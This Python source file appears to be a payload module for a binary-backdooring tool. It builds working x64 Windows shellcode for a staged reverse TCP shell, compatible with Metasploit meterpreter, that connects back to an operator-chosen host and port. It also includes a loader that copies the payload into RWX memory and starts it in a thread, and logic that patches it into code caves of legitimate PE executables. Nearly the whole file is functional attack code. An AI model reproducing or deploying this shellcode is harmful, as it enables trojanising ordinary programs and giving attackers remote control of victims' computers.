import struct
import os
import logging
from core import enum
from core import support
logger = logging.getLogger(__name__)
from pe.core import eat_code_caves
from common import common

class reverse_tcp_staged_threaded():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "reverse_tcp_staged_threaded"
        self.description = """Staged reverse tcp shell compatable with reverse TCP meterpreter payload from MSF"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = bytes("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              , 'iso-8859-1')

        self.stackrestore = bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             , 'iso-8859-1')
        self.apis_needed = None
        self.payload_type = 'staged'
        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # no encoders
        self.PM.found_encoder = False
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        Ported the x32 payload from msfvenom for patching win32 binaries (shellcode1)
        with the help of Steven Fewer's work on msf win64 payloads.
        """

        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode2 = b"\xe8"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)

            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = b"\xE8\xB8\xFF\xFF\xFF"

        """
        shellcode2
        /*
         * windows/x64/shell/reverse_tcp - 422 bytes (stage 1)
           ^^windows/x64/meterpreter/reverse_tcp will work with this
         * http://www.metasploit.com
         * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080,
         */
         """

        if self.MODE.lower() != 'add_section':
            if 'CavesPicked' in self.BDF.pe_object:
                # will need to call/implement clearn code caves for all PEs check if same for 32/64
                # This can be called outside of this function
                self.shellcode2 += self.PM.BDF.pe_object['CleanCavesStub']

            else:
                self.shellcode2 += b"\x41" * 90

        #payload
        self.shellcode2 += bytes("\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                            "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                            "\x49\x89\xe5\x49\xbc\x02\x00"
                            , 'iso-8859-1'
                            )
        self.shellcode2 += struct.pack('!H', int(self.PORT))
        self.shellcode2 += common.pack_ip_addresses(self.HOST)
        self.shellcode2 += bytes("\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec"
                            "\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41"
                            "\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41"
                            "\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
                            "\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
                            "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
                            "\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41"
                            "\xff\xe7", 'iso-8859-1'
                            )

       

        self.shellcode1 = bytes("\x90"                              # <--THAT'S A NOP. \o/
                           "\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           #api_call
                           "\x41\x51"                          # push r9
                           "\x41\x50"                          # push r8
                           "\x52"                              # push rdx
                           "\x51"                              # push rcx
                           "\x56"                              # push rsi
                           "\x48\x31\xD2"                      # xor rdx,rdx
                           "\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           "\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           "\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           #next_mod
                           "\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           "\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           "\x4d\x31\xc9"                      # xor r9,r9
                           #loop_modname
                           "\x48\x31\xc0"                      # xor rax,rax
                           "\xac"                              # lods
                           "\x3c\x61"                          # cmp al, 61h (a)
                           "\x7c\x02"                          # jl 02
                           "\x2c\x20"                          # sub al, 0x20
                           #not_lowercase
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           "\x41\x01\xc1"                      # add r9d, eax
                           "\xe2\xed"                          # loop until read, back to xor rax, rax
                           "\x52"                              # push rdx ; Save the current position in the module list for later
                           "\x41\x51"                          # push r9 ; Save the current module hash for later
                                                               # ; Proceed to itterate the export address table,
                           "\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           "\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           "\x48\x85\xc0"                      # test rax, rax ; Test if no export address table is present
                           "\x74\x67"                          # je get_next_mod1 ; If no EAT present, process the next module
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x50"                              # push rax ; Save the current modules EAT
                           "\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function names
                           "\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function names
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                                                               # ; Computing the module hash + function hash
                           #get_next_func: ;
                           "\xe3\x56"                          # jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                           "\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           "\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           "\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                               #  ; And compare it to the one we wan
                           #loop_funcname: ;
                           "\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           "\xac"                              # lodsb ; Read in the next byte of the ASCII function name
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           "\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           "\x38\xe0"                          # cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                           "\x75\xf1"                          # jne loop_funcname ; If we have not reached the null terminator, continue
                           "\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash to the function hash
                           "\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                           "\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash if we have not found it
                                                               # ; If found, fix up stack, call the function and then value else compute the next one...
                           "\x58"                              # pop rax ; Restore the current modules EAT
                           "\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           "\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the function addresses table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address to get the functions actual VA
                                                               # ; We now fix up the stack and perform the call to the drsired function...
                           #finish:
                           "\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           "\x41\x58"                          # pop r8 ; Clear off the current position in the module list
                           "\x5E"                              # pop rsi ; Restore RSI
                           "\x59"                              # pop rcx ; Restore the 1st parameter
                           "\x5A"                              # pop rdx ; Restore the 2nd parameter
                           "\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           "\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           "\x41\x5A"                          # pop r10 ; pop off the return address
                           "\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                               #  ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                           "\x41\x52"                          # push r10 ; push back the return address
                           "\xFF\xE0"                          # jmp rax ; Jump into the required function
                                                               # ; We now automagically return to the correct caller...
                           # get_next_mod:
                           "\x58"                              # pop rax ; Pop off the current (now the previous) modules EAT
                           # get_next_mod1:
                           "\x41\x59"                          # pop r9 ; Pop off the current (now the previous) modules hash
                           "\x5A"                              # pop rdx ; Restore our position in the module list
                           "\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           "\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           , 'iso-8859-1')
                           # allocate
        self.shellcode1 += bytes("\x5d"                              # pop rbp
                            "\x49\xc7\xc6" 
                            , 'iso-8859-1')                     # mov r14, size of payload below
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += bytes("\x6a\x40"                          # push 40h
                            "\x41\x59"                          # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              # push 1000h
                            "\x41\x58"                          # pop r8.. now 1000h
                            "\x4C\x89\xF2"                      # mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              # push E553a458
                            "\x41\x5A"                          # pop r10
                            "\xff\xd5"                          # call rbp
                            "\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            "\x48\xC7\xC1"
                            , 'iso-8859-1')
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        #call the get_payload right before the payload
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)

            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xeb\x43"

                            # got_payload:
        self.shellcode1 += bytes("\x5e"                                  # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0"  # xor rax,rax

                            "\x50"                                   # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                   # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                           # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                           # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                           # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                           # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"           # mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                               # call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                       # add rsp, 50
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            , 'iso-8859-1'
                            )

        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 2)

            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            #self.shellcode1 += "\xE9\xab\x01\x00\x00"
            self.shellcode1 += b"\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return self.stackpreserve + self.shellcode1, self.shellcode2
